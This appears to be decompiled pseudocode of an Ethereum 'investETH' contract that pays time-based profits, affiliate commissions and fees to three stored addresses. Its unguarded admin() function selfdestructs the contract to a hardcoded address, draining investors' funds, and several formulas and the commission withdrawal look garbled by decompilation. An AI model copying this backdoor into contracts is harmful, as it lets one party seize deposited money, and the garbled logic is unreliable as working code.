contract main {




// =====================  Runtime code  =====================


const getBalance = eth.balance(this.address)


mapping of uint256 invested;
mapping of uint256 lastInvest;
mapping of uint256 affiliateCommision;
address stor3;
address stor4;
address stor5;

function getAffiliateCommision() {
    return affiliateCommision[address(msg.sender)]
}

function affiliateCommision(address arg1) {
    return affiliateCommision[arg1]
}

function lastInvest(address arg1) {
    return lastInvest[arg1]
}

function getInvested() {
    return invested[address(msg.sender)]
}

function investedETH(address arg1) {
    return invested[arg1]
}

function admin() {
    selfdestruct(0x8948e4b00deb0a5adb909f4dc5789d20d0851d71)
}

function _fallback() payable {
    revert
}

function withdrawAffiliateCommision() {
    require affiliateCommision[address(msg.sender)] > 0
    affiliateCommision[address(msg.sender)] = 0
    call msg.sender with:
       value affiliateCommision[address(msg.sender)] wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function getProfit(address arg1) {
    require lastInvest[address(arg1)] <= block.timestamp
    if not block.timestamp - lastInvest[address(arg1)]:
        return 0
    require block.timestamp - lastInvest[address(arg1)]
    require (block.timestamp * invested[address(arg1)]) - (lastInvest[address(arg1)] * invested[address(arg1)]) / block.timestamp - lastInvest[address(arg1)] == invested[address(arg1)]
    return ((block.timestamp * invested[address(arg1)]) - (lastInvest[address(arg1)] * invested[address(arg1)]) / 4800000)
}

function getProfitFromSender() {
    require lastInvest[address(msg.sender)] <= block.timestamp
    if not block.timestamp - lastInvest[address(msg.sender)]:
        return 0
    require block.timestamp - lastInvest[address(msg.sender)]
    require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / block.timestamp - lastInvest[address(msg.sender)] == invested[address(msg.sender)]
    return ((block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000)
}

function withdraw() {
    require lastInvest[address(msg.sender)] <= block.timestamp
    require block.timestamp - lastInvest[address(msg.sender)]
    require block.timestamp - lastInvest[address(msg.sender)]
    require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / block.timestamp - lastInvest[address(msg.sender)] == invested[address(msg.sender)]
    require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000 > 0
    lastInvest[address(msg.sender)] = block.timestamp
    call msg.sender with:
       value (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000 wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function reinvestProfit() {
    require lastInvest[address(msg.sender)] <= block.timestamp
    require block.timestamp - lastInvest[address(msg.sender)]
    require block.timestamp - lastInvest[address(msg.sender)]
    require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / block.timestamp - lastInvest[address(msg.sender)] == invested[address(msg.sender)]
    require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000 > 0
    lastInvest[address(msg.sender)] = block.timestamp
    require invested[address(msg.sender)] + ((block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000) >= invested[address(msg.sender)]
    invested[address(msg.sender)] += (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000
}

function investETH(address arg1) payable {
    require msg.value >= 5 * 10^16
    require lastInvest[address(msg.sender)] <= block.timestamp
    if block.timestamp - lastInvest[address(msg.sender)]:
        require block.timestamp - lastInvest[address(msg.sender)]
        require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / block.timestamp - lastInvest[address(msg.sender)] == invested[address(msg.sender)]
        if (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000 > 0:
            require lastInvest[address(msg.sender)] <= block.timestamp
            if not block.timestamp - lastInvest[address(msg.sender)]:
                lastInvest[address(msg.sender)] = block.timestamp
                call msg.sender with:
                     gas 2300 wei
            else:
                require block.timestamp - lastInvest[address(msg.sender)]
                require (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / block.timestamp - lastInvest[address(msg.sender)] == invested[address(msg.sender)]
                lastInvest[address(msg.sender)] = block.timestamp
                call msg.sender with:
                   value (block.timestamp * invested[address(msg.sender)]) - (lastInvest[address(msg.sender)] * invested[address(msg.sender)]) / 4800000 wei
                     gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
    if arg1 != msg.sender:
        if arg1 != 1:
            require affiliateCommision[address(arg1)] + (msg.value / 40) >= affiliateCommision[address(arg1)]
            affiliateCommision[address(arg1)] += msg.value / 40
    if not msg.value / 100:
        call stor3 with:
             gas 2300 wei
    else:
        require msg.value / 100
        require 5 * msg.value / 100 / msg.value / 100 == 5
        call stor3 with:
           value 5 * msg.value / 100 wei
             gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    if not msg.value / 100:
        call stor4 with:
             gas 2300 wei
    else:
        require msg.value / 100
        require 3 * msg.value / 100 / msg.value / 100 == 3
        call stor4 with:
           value 3 * msg.value / 100 wei
             gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    if not msg.value / 100:
        call stor5 with:
             gas 2300 wei
    else:
        require msg.value / 100
        require msg.value / 100 / msg.value / 100 == 1
        call stor5 with:
           value msg.value / 100 wei
             gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require invested[address(msg.sender)] + msg.value >= invested[address(msg.sender)]
    invested[address(msg.sender)] += msg.value
    lastInvest[address(msg.sender)] = block.timestamp
}



}
